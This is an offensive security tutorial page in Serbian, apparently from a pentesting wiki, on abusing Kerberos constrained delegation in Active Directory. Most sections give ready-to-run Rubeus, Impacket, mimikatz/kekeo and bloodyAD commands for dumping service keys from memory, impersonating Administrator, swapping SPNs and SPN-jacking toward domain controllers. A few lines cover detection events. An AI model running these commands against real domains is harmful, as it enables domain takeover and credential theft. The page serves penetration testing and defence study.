# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Koristeći ovo, Domain admin može **dozvoliti** računaru da se **predstavlja kao korisnik ili računar** prema bilo kom **servisu** na računaru.

- **Service for User to self (_S4U2self_):** Bilo koji **service account koji poseduje SPN** obično može da dobije TGS za sebe u ime proizvoljnog korisnika. Ako nalog takođe ima [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) u _userAccountControl_, taj TGS je **forwardable**, što protocol transition čini direktno korisnim za **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** **Service account** može da dobije TGS u ime korisnika za SPN-ove navedene u **msDS-AllowedToDelegateTo**. Evidence ticket korišćen u S4U2Proxy mora biti **forwardable** ticket ka delegating service-u: ili pravi client-to-service ticket uhvaćen od žrtve, ili onaj generisan pomoću **S4U2Self + T2A4D**.

**Napomena**: Ako je korisnik u AD-u označen opcijom ‘_Account is sensitive and cannot be delegated_’ ili je član grupe **Protected Users**, obično nećete moći da se **predstavljate kao on** putem constrained delegation-a. U modernim domenima, pri napadu na naloge sa omogućenim delegation-om prednost dajte **AES** materijalu u odnosu na pretpostavke zasnovane samo na RC4-u.

To znači da, ako **kompromitujete hash servisnog naloga**, možete da se **predstavljate kao korisnici** i da u njihovo ime dobijete **pristup** bilo kom **servisu** na navedenim računarima (moguć **privesc**).

Pored toga, nećete imati pristup **samo servisu za koji korisnik može da se predstavlja, već bilo kom servisu**, zato što se SPN (traženo ime servisa) ne proverava (u ticket-u ovaj deo nije enkriptovan/potpisan). Zato, ako imate pristup **CIFS servisu**, možete imati pristup i **HOST servisu** koristeći `/altservice` flag u Rubeus-u, na primer. Ista slabost sa zamenom SPN-a zloupotrebljava se pomoću **Impacket getST -altservice** i drugih alata.

Takođe, **LDAP service access na DC-u** je ono što je potrebno za iskorišćavanje **DCSync-a**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Napomena za operatora:** nemojte se oslanjati samo na snimke ekrana **ADUC**-a ili BloodHound-a prilikom provere **gMSA/sMSA** naloga. Ti nalozi često skrivaju uobičajenu karticu Delegation, zato direktno enumerišite sirove atribute **`userAccountControl`** i **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition naspram Kerberos-only constrained delegation

Ako kompromitovani nalog ima **T2A4D**, obično možete završiti ceo lanac **`S4U2Self -> S4U2Proxy`** samo pomoću service key/TGT-a.<sup>[[2]](#references)</sup>

Ako ima samo **`msDS-AllowedToDelegateTo`** (klasični režim **"Use Kerberos only"**), delegation se i dalje može zloupotrebiti, ali evidence ticket za S4U2Proxy mora biti **stvarni forwardable user-to-service ticket** za delegating service. U praksi to znači krađu ili hvatanje victim TGS-a iz **LSASS/ccache** i njegovo prosleđivanje u drugu fazu (`/tgs:` u Rubeus-u). **Non-forwardable** S4U2Self ticket nije dovoljan za classic constrained delegation; ako je to vaš jedini evidence ticket, proverite [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Napomene o cross-domain constrained delegation (2025+)

Od **Windows Server 2012/2012 R2**, KDC podržava **constrained delegation across domains/forests** putem S4U2Proxy extensions. Moderni build-ovi (Windows Server 2016–2025) zadržavaju ovo ponašanje i dodaju dva PAC SID-a kao signal za protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) kada se user normalno autentifikuje.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) kada je service potvrdio identity putem protocol transition-a.

Očekujte `SERVICE_ASSERTED_IDENTITY` unutar PAC-a kada se protocol transition koristi između domena, što potvrđuje da je S4U2Proxy korak uspešno izvršen.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Noviji Impacket (0.11.x+) izlaže isti S4U chain i SPN swapping kao Rubeus:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Ako više volite da prvo kreirate user ST (npr. koristeći samo offline hash), uparite **ticketer.py** sa **getST.py** za S4U2Proxy. **tgssub.py** je takođe koristan kada već imate ispravan ccache i samo treba da zamenite klasu servisa za isti host. Pogledajte otvoreni Impacket issue #1713 za aktuelne specifičnosti (KRB_AP_ERR_MODIFIED kada forged ST ne odgovara SPN ključu).<sup>[[2]](#references)</sup>

### SPN-jacking: preusmeravanje cilja constrained delegation-a

Klasični constrained delegation autorizuje **SPN string** u `msDS-AllowedToDelegateTo`, a ne nepromenljivi ciljni SID. Tokom S4U2Proxy-a, KDC pronalazi nalog koji trenutno poseduje taj SPN i šifruje service ticket dugoročnim ključem tog naloga. Zato kontrola delegirajućeg naloga, zajedno sa `WriteSPN` nad drugim service/computer nalogom, može da preusmeri nepromenjen delegation constraint bez `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Postoje dve varijante:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** dozvoljeni SPN je orphaned zato što je njegov prethodni vlasnik obrisan, preimenovan ili mu je SPN uklonjen. Dodajte ga direktno željenom ciljnom nalogu.
- **Live SPN-jacking:** SPN i dalje pripada izvornom nalogu. Validacija dupliranog SPN-a obično blokira upis na odredištu, pa je `WriteSPN` potreban nad oba objekta: uklonite ga sa izvora, dodajte ga cilju, pribavite ticket i vratite originalnu registraciju.

Sledeći apstraktni Linux tok premešta dozvoljeni SPN, pokreće S4U kao kompromitovani delegirajući principal i ponovo upisuje naziv servisa u ticketu kako bi ukazivao na koristan servis na novom cilju.<sup>[[5]](#references)[[6]](#references)</sup>
```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
-impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
"$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```
`-altservice` je druga, odvojena primitiva. S4U2Proxy ticket je bio šifrovan za nalog koji sada poseduje `$DELEGATED_SPN`; pošto se naziv servisa ticketa (`sname`) nalazi izvan šifrovanog tela ticketa, tooling može da zameni drugu klasu servisa/hostname čiji servis koristi isti ključ naloga. SPN-jacking prvo menja **koji ključ naloga** štiti ticket, dok zamena klase servisa menja **gde se taj ticket prosleđuje**.<sup>[[5]](#references)[[6]](#references)</sup>

Kod live jackinga, obrnite ta dva LDAP upisa odmah nakon preuzimanja ticketa kako ne biste prekinuli legitimni servis. Na DC-ovima sa omogućenim auditingom računarskih naloga, tražite Security event **4742** u kojem je `servicePrincipalName` uklonjen sa jednog računara i ubrzo zatim dodat drugom, naročito kada se SPN hostname razlikuje od vrednosti `dNSHostName` odredišta. Povežite to sa eventom **4769**: S4U2Self prikazuje isti nalog kao klijenta/servis, dok S4U2Proxy popunjava **Transited Services**.<sup>[[5]](#references)</sup>

### Automatizovanje podešavanja delegacije pomoću kredencijala sa niskim privilegijama

Ako već imate **GenericAll/WriteDACL** nad računarskim ili servisnim nalogom, potrebne atribute možete daljinski postaviti bez RSAT-a koristeći **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Ovo vam omogućava da napravite putanju constrained delegation za privesc bez DA privilegija čim možete da upisujete te atribute.

- Korak 1: **Preuzmite TGT dozvoljenog servisa**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Postoje **drugi načini za dobijanje TGT tiketa** ili **RC4** ili **AES256** bez SYSTEM privilegija na računaru, kao što su Printer Bug i unconstrain delegation, NTLM relaying i Active Directory Certificate Service abuse
>
> **Samo sa tim TGT tiketom (ili njegovim hash-om) možete izvršiti ovaj napad bez kompromitovanja celog računara.**

- Korak 2: **Dobijte TGS za servis imitirajući korisnika**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Više informacija na ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Pregled Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Zloupotreba Delegation sa Impacket-om (Deo 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity je ubio domen: Ofanzivni pregled Kerberos-a (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: Granični slučaj u zloupotrebi WriteSPN-a](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
